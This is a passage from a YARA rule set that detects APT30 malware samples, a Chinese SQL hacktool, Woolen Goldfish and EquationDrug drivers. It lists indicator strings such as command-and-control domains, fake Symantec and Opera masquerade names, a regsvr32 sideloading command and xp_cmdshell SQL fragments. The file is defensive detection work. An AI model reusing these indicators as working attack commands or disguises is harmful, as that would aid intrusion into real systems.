meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:41\"\n      score = 95\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e62a63307deead5c9fcca6b9a2d51fb0\"\n      hash2 = \"5b590798da581c894d8a87964763aa8b\"\n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"www.flyeagles.com\" fullword ascii\n      $s1 = \"iexplore.exe\" fullword ascii\n      $s2 = \"www.km-nyc.com\" fullword ascii\n      $s3 = \"cmdLine.exe\" fullword ascii\n      $s4 = \"Software\\\\Microsoft\\\\CurrentNetInf\" fullword ascii\n      $s5 = \"/dizhi.gif\" ascii\n      $s6 = \"/connect.gif\" ascii\n      $s7 = \"USBTest.sys\" fullword ascii\n      $s8 = \"/ver.htm\" fullword ascii\n      $s11 = \"\\\\netscv.exe\" ascii\n      $s12 = \"/app.htm\" fullword ascii\n      $s13 = \"\\\\netsvc.exe\" ascii\n      $s14 = \"/exe.htm\" fullword ascii\n      $s18 = \"MicrosoftHaveAck\" fullword ascii\n      $s19 = \"MicrosoftHaveExit\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and 7 of them\n}\n\nrule APT30_Sample_29_RID2BE4 : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"LSSAS.exe\" fullword ascii\n      $s1 = \"Software\\\\Microsoft\\\\FlashDiskInf\" fullword ascii\n      $s2 = \".petite\" fullword ascii\n      $s3 = \"MicrosoftFlashExit\" fullword ascii\n      $s4 = \"MicrosoftFlashHaveExit\" fullword ascii\n      $s5 = \"MicrosoftFlashHaveAck\" fullword ascii\n      $s6 = \"\\\\driver32\" ascii\n      $s7 = \"MicrosoftFlashZJ\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_30_RID2BDC : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"5.1.2600.2180 (xpsp_sp2_rtm.040803-2158)\" fullword wide\n      $s3 = \"RnhwtxtkyLRRMf{jJ}ny\" fullword ascii\n      $s4 = \"RnhwtxtkyLRRJ}ny\" fullword ascii\n      $s5 = \"ZRLDownloadToFileA\" fullword ascii\n      $s9 = \"5.1.2600.2180\" fullword wide\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_31_RID2BDD : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:41\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\ZJRsv.tem\" ascii\n      $s1 = \"forceguest\" fullword ascii\n      $s4 = \"\\\\$NtUninstallKB570317$\" ascii\n      $s8 = \"[Can'tGetIP]\" fullword ascii\n      $s14 = \"QWERTY:,`/\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_J_RID2C1E : APT DEMO FILE G0013 GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:35:31\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"49aca228674651cba776be727bdb7e60\"\n      hash2 = \"5c7a6b3d1b85fad17333e02608844703\"\n      hash3 = \"649fa64127fef1305ba141dd58fb83a5\"\n      tags = \"APT, DEMO, FILE, G0013, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Launcher.EXE\" fullword wide\n      $s1 = \"Symantec Security Technologies\" fullword wide\n      $s2 = \"\\\\Symantec LiveUpdate.lnk\" ascii\n      $s3 = \"Symantec Service Framework\" fullword wide\n      $s4 = \"\\\\ccSvcHst.exe\" ascii\n      $s5 = \"\\\\wssfmgr.exe\" ascii\n      $s6 = \"Symantec Corporation\" fullword wide\n      $s7 = \"\\\\5.1.0.29\" ascii\n      $s8 = \"\\\\Engine\" ascii\n      $s9 = \"Copyright (C) 2000-2010 Symantec Corporation. All rights reserved.\" fullword wide\n      $s10 = \"Symantec LiveUpdate\" fullword ascii\n      $s11 = \"\\\\Norton360\" ascii\n      $s15 = \"BinRes\" fullword ascii\n      $s16 = \"\\\\readme.lz\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Microfost_RID2C6E : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:48:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Copyright (c) 2007 Microfost All Rights Reserved\" fullword wide\n      $s2 = \"Microfost\" fullword wide\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_K_RID2C1F : APT DEMO FILE G0013 GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:35:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      tags = \"APT, DEMO, FILE, G0013, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Maybe a Encrypted Flash\" fullword ascii\n      $s0 = \"C:\\\\Program Files\\\\Common Files\\\\System\\\\wab32\" fullword ascii\n      $s1 = \"\\\\TEMP\\\\\" ascii\n      $s2 = \"\\\\Temporary Internet Files\\\\\" ascii\n      $s5 = \"%s Size:%u Bytes\" fullword ascii\n      $s7 = \"$.DATA$\" fullword ascii\n      $s10 = \"? Size:%u By s\" fullword ascii\n      $s12 = \"Maybe a Encrypted Flash\" fullword ascii\n      $s14 = \"Name:%-32s\" fullword ascii\n      $s15 = \"NickName:%-32s\" fullword ascii\n      $s19 = \"Email:%-32s\" fullword ascii\n      $s21 = \"C:\\\\Prog\" ascii\n      $s22 = \"$LDDATA$\" ascii\n      $s31 = \"Copy File %s OK!\" fullword ascii\n      $s32 = \"%s Space:%uM,FreeSpace:%uM\" fullword ascii\n      $s34 = \"open=%s\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and ( all of ( $x* ) and 3 of ( $s* ) )\n}\n\nrule APT30_Sample_33_RID2BDF : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Version 4.7.3001\" fullword wide\n      $s1 = \"msmsgr.exe\" fullword wide\n      $s2 = \"MYUSER32.dll\" fullword ascii\n      $s3 = \"MYADVAPI32.dll\" fullword ascii\n      $s4 = \"CeleWare.NET1\" fullword ascii\n      $s6 = \"MYMSVCRT.dll\" fullword ascii\n      $s7 = \"Microsoft(R) is a registered trademark of Microsoft Corporation in the\" wide\n      $s8 = \"WWW.CeleWare.NET1\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and 6 of them\n}\n\nrule APT30_Sample_34_RID2BE0 : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:11\"\n      score = 95\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"dizhi.gif\" ascii\n      $s1 = \"eagles.vip.nse\" ascii\n      $s4 = \"o%S:S0\" ascii\n      $s5 = \"la/4.0\" ascii\n      $s6 = \"s#!<4!2>s02==<'s1\" ascii\n      $s7 = \"HlobalAl\" ascii\n      $s9 = \"vcMicrosoftHaveAck7\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_35_RID2BE1 : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:21\"\n      score = 95\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"WhBoyIEXPLORE.EXE.exe\" fullword ascii\n      $s5 = \"Startup>A\" fullword ascii\n      $s18 = \"olhelp32Snapshot\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_1_RID2BAA : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:16:11\"\n      score = 95\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"#hostid\" fullword ascii\n      $s1 = \"\\\\Windows\\\\C\" ascii\n      $s5 = \"TimUmove\" fullword ascii\n      $s6 = \"Moziea/4.0 (c\" fullword ascii\n      $s7 = \"StartupNA\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_1_RID2C05 : APT DEMO FILE G0013 GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:31:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"cb4263cab467845dae9fae427e3bbeb31c6a14c2\"\n      hash2 = \"b69b95db8a55a050d6d6c0cba13d73975b8219ca\"\n      hash3 = \"5c29e21bbe8873778f9363258f5e570dddcadeb9\"\n      tags = \"APT, DEMO, FILE, G0013, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"%s\\\\%s.txt\" fullword\n      $s1 = \"\\\\ldsysinfo.txt\" \n      $s4 = \"(Extended Wansung)\" fullword\n      $s6 = \"Computer Name:\" fullword\n      $s7 = \"%s %uKB %04u-%02u-%02u %02u:%02u\" fullword\n      $s8 = \"ASSAMESE\" fullword\n      $s9 = \"BELARUSIAN\" fullword\n      $s10 = \"(PR China)\" fullword\n      $s14 = \"(French)\" fullword\n      $s15 = \"AdvancedServer\" fullword\n      $s16 = \"DataCenterServer\" fullword\n      $s18 = \"(Finland)\" fullword\n      $s19 = \"%s %04u-%02u-%02u %02u:%02u\" fullword\n      $s20 = \"(Chile)\" fullword\n   condition: \n      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_2_RID2C06 : APT DEMO FILE G0013 GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - from many files\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:31:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7f11f5c9475240e5dd2eea7726c9229972cffc1f\"\n      hash2 = \"94d3f91d1e50ecea729617729013c3d143bf2c3e\"\n      hash3 = \"7e516ec04f28c76d67b8111ddfe58bbd628362cc\"\n      tags = \"APT, DEMO, FILE, G0013, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"%s\\\\%s\\\\KB985109.log\" fullword\n      $s1 = \"%s\\\\%s\\\\KB989109.log\" fullword\n      $s2 = \"Opera.exe\" fullword wide\n      $s3 = \"%s:All online success on %u!\" fullword\n      $s4 = \"%s:list online success on %u!\" fullword\n      $s5 = \"%s:All online fail!\" fullword\n      $s6 = \"Copyright Opera Software 1995-\" wide\n      $s7 = \"%s:list online fail!\" fullword\n      $s8 = \"OnlineTmp.txt\" fullword\n      $s9 = \"Opera Internet Browser\" fullword wide\n      $s12 = \"Opera Software\" fullword wide\n      $s15 = \"Check lan have done!!!\" fullword\n      $s16 = \"List End.\" fullword\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_4_RID2C08 : APT DEMO FILE G0013 GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:31:51\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b47e20ac5889700438dc241f28f4e224070810d2\"\n      hash2 = \"a9a50673ac000a313f3ddba55d63d9773b9f4143\"\n      hash3 = \"ac96d7f5957aef09bd983465c497de24c6d17a92\"\n      tags = \"APT, DEMO, FILE, G0013, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"del NetEagle_Scout.bat\" fullword\n      $s1 = \"NetEagle_Scout.bat\" fullword\n      $s2 = \"\\\\visit.exe\" \n      $s3 = \"\\\\System.exe\" \n      $s4 = \"\\\\System.dat\" \n      $s5 = \"\\\\ieupdate.exe\" \n      $s6 = \"GOTO ERROR\" fullword\n      $s7 = \":ERROR\" fullword\n      $s9 = \"IF EXIST \" fullword\n      $s10 = \"ioiocn\" fullword\n      $s11 = \"SetFileAttribute\" fullword\n      $s12 = \"le_0*^il\" fullword\n      $s13 = \"le_.*^il\" fullword\n      $s14 = \"le_-*^il\" fullword\n   condition: \n      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_5_RID2C09 : APT DEMO FILE G0013 GEN T1218_010 {\n   meta:\n      description = \"FireEye APT30 Report Sample - from files 592381dfa14e61bce089cd00c9b118ae, b493ad490b691b8732983dcca8ea8b6f, b83d43e3b2f0b0a0e5cc047ef258c2cb\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:32:01\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"dfc9a87df2d585c479ab02602133934b055d156f\"\n      hash2 = \"bf59d5ff7d38ec5ffb91296e002e8742baf24db5\"\n      tags = \"APT, DEMO, FILE, G0013, GEN, T1218_010\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"regsvr32 /s \\\"%ProgramFiles%\\\\Norton360\\\\Engine\\\\5.1.0.29\\\\ashelper.dll\\\"\" fullword\n      $s1 = \"name=\\\"ftpserver.exe\\\"/>\" fullword\n      $s2 = \"LiveUpdate.EXE\" fullword wide\n      $s3 = \"<description>FTP Explorer</description>\" fullword\n      $s4 = \"\\\\ashelper.dll\" \n      $s5 = \"LiveUpdate\" fullword wide\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_6_RID2C0A : APT DEMO FILE G0013 GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - from files 168d207d0599ed0bb5bcfca3b3e7a9d3, 1e6ee89fddcf23132ee12802337add61, 5dd625af837e164dd2084b1f44a45808\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:32:11\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2c5e347083b77c9ead9e75d41e2fabe096460bba\"\n      hash2 = \"5d39a567b50c74c4a921b5f65713f78023099933\"\n      tags = \"APT, DEMO, FILE, G0013, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"GetStar\" fullword\n      $s1 = \".rdUaS\" fullword\n      $s2 = \"%sOTwp/&A\\\\L\" fullword\n      $s3 = \"a Encrt% Flash Disk\" fullword\n      $s4 = \"ypeAutoRuChec\" fullword\n      $s5 = \"NoDriveT\" fullword\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_7_RID2C0B : APT DEMO FILE G0013 GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - from files 853a20f5fc6d16202828df132c41a061, 9c0cad1560cd0ffe2aa570621ef7d0a0, b590c15499448639c2748ff9e0d214b2\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:32:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e814914079af78d9f1b71000fee3c29d31d9b586\"\n      hash2 = \"0263de239ccef669c47399856d481e3361408e90\"\n      tags = \"APT, DEMO, FILE, G0013, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Xjapor_*ata\" fullword\n      $s2 = \"Xjapor_o*ata\" fullword\n      $s4 = \"Ouopai\" fullword\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_8_RID2C0C : APT DEMO FILE G0013 GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - from files 7c307ca84f922674049c0c43ca09bec1, b8617302180d331e197cc0433fc5023d, e6289e7f9f26be692cbe6f335a706014\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:32:31\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a9a50673ac000a313f3ddba55d63d9773b9f4143\"\n      hash2 = \"ac96d7f5957aef09bd983465c497de24c6d17a92\"\n      tags = \"APT, DEMO, FILE, G0013, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Windows NT4.0\" fullword\n      $s1 = \"Windows NT3.51\" fullword\n      $s2 = \"%d;%d;%d;%ld;%ld;%ld;\" fullword\n      $s3 = \"%s %d.%d Build%d %s\" fullword\n      $s4 = \"MSAFD Tcpip [TCP/IP]\" fullword\n      $s5 = \"SQSRSS\" fullword\n      $s8 = \"WM_COMP\" fullword\n      $s9 = \"WM_MBU\" fullword\n      $s11 = \"WM_GRID\" fullword\n      $s12 = \"WM_RBU\" fullword\n   condition: \n      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_9_RID2C0D : APT DEMO FILE G0013 GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:32:41\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"27a2b981d4c0bb8c3628bfe990db4619ddfdff74\"\n      hash2 = \"05f66492c163ec2a24c6a87c7a43028c5f632437\"\n      hash3 = \"263f094da3f64e72ef8dc3d02be4fb33de1fdb96\"\n      tags = \"APT, DEMO, FILE, G0013, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"%s\\\\%s\\\\$NtRecDoc$\" fullword\n      $s1 = \"%s(%u)%s\" fullword\n      $s2 = \"http://%s%s%s\" fullword\n      $s3 = \"1.9.1.17\" fullword wide\n      $s4 = \"(C)Firefox and Mozilla Developers, according to the MPL 1.1/GPL 2.0/LGPL\" wide\n   condition: \n      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule CN_Toolset_sig_1433_135_sqlr_RID30D0 : CHINA DEMO HKTL {\n   meta:\n      description = \"Detects a Chinese hacktool from a disclosed toolset - file sqlr.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://qiannao.com/ls/905300366/33834c0c/\"\n      date = \"2015-03-30 12:55:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Connect to %s MSSQL server success. Type Command at Prompt.\" fullword ascii\n      $s11 = \";DATABASE=master\" fullword ascii\n      $s12 = \"xp_cmdshell '\" fullword ascii\n      $s14 = \"SELECT * FROM OPENROWSET('SQLOLEDB','Trusted_Connection=Yes;Data Source=myserver\" ascii\n   condition: \n      all of them\n}\n\nrule WoolenGoldfish_Sample_1_RID3006 : APT DEMO G0130 {\n   meta:\n      description = \"Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/NpJpVZ\"\n      date = \"2015-03-25 12:22:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, G0130\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Cannot execute (%d)\" fullword ascii\n      $s16 = \"SvcName\" fullword ascii\n   condition: \n      all of them\n}\n\nrule APT_WoolenGoldfish_Generic_Mar15_2_RID338B : APT DEMO G0130 GEN {\n   meta:\n      description = \"Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ\"\n      author = \"Florian Roth\"\n      reference = \"https://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/operation-woolen-goldfish-when-kittens-go-phishing\"\n      date = \"2015-03-25 14:52:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"47b1c9caabe3ae681934a33cd6f3a1b311fd7f9f\"\n      hash2 = \"62172eee1a4591bde2658175dd5b8652d5aead2a\"\n      hash3 = \"7fef48e1303e40110798dfec929ad88f1ad4fbd8\"\n      tags = \"APT, DEMO, G0130, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"modules\\\\exploits\\\\littletools\\\\agent_wrapper\\\\release\" ascii\n   condition: \n      all of them\n}\n\nrule EquationDrug_NetworkSniffer1_RID3230 : APT DEMO T1040 {\n   meta:\n      description = \"EquationDrug - Backdoor driven by network sniffer - mstcp32.sys, fat32.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 13:54:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      tags = \"APT, DEMO, T1040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n      $s1 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" wide\n      $s3 = \"sys\\\\mstcp32.dbg\" fullword ascii\n      $s7 = \"mstcp32.sys\" fullword wide\n      $s8 = \"p32.sys\" fullword ascii\n      $s9 = \"\\\\Device\\\\%ws_%ws\" wide\n      $s10 = \"\\\\DosDevices\\\\%ws\" wide\n      $s11 = \"\\\\Device\\\\%ws\" wide\n   condition: \n      all of them\n}\n\nrule EquationDrug_NetworkSniffer2_RID3231 : APT DEMO T1040 {\n   meta:\n      description = \"EquationDrug - Network Sniffer - tdip.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 13:54:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, T1040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n      $s1 = \"IP Transport Driver\" fullword wide\n      $s2 = \"tdip.sys\" fullword wide\n      $s3 = \"sys\\\\tdip.dbg\" fullword ascii\n      $s4 = \"dip.sys\" fullword ascii\n      $s5 = \"\\\\Device\\\\%ws_%ws\" wide\n      $s6 = \"\\\\DosDevices\\\\%ws\" wide\n      $s7 = \"\\\\Device\\\\%ws\" wide\n   condition: \n      all of them\n}\n\nrule EquationDrug_NetworkSniffer3_RID3232 : APT DEMO T1040 {\n   meta:\n      description = \"EquationDrug - Network Sniffer - tdip.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 13:54:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, T1040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Corporation. All rights reserved.\" fullword wide\n      $s1 = \"IP Transport Driver\" fullword wide\n      $s2 = \"tdip.sys\" fullword wide\n      $s3 = \"tdip.pdb\" fullword ascii\n   condition: \n      all of them\n}\n\nrule EquationDrug_VolRec_Driver_RID315E : APT DEMO {\n   meta:\n      description = \"EquationDrug - Collector plugin for Volrec - msrstd.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 13:19:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"msrstd.sys\" fullword wide\n      $s1 = \"msrstd.pdb\" fullword ascii\n      $s2 = \"msrstd driver\" fullword wide\n   condition: \n      all of them\n}\n\nrule EquationDrug_KernelRootkit_RID3195 : APT DEMO T1014 T1543_003 {\n   meta:\n      description = \"EquationDrug - Kernel mode stage 0 and rootkit (Windows 2000 and above) - msndsrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 13:28:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      tags = \"APT, DEMO, T1014, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n      $s1 = \"Parmsndsrv.dbg\" fullword ascii\n      $s2 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" wide\n      $s3 = \"msndsrv.sys\" fullword wide\n      $s5 = \"\\\\REGISTRY\\\\MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Windows\" wide\n      $s6 = \"\\\\Device\\\\%ws_%ws\" wide\n      $s7 = \"\\\\DosDevices\\\\%ws\" wide\n      $s9 = \"\\\\Device\\\\%ws\" wide\n   condition: \n      all of them\n}\n\nrule EquationDrug_Keylogger_RID2FF1 : APT DEMO T1056_001 {\n   meta:\n      description = \"EquationDrug - Key/clipboard logger driver - msrtvd.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = 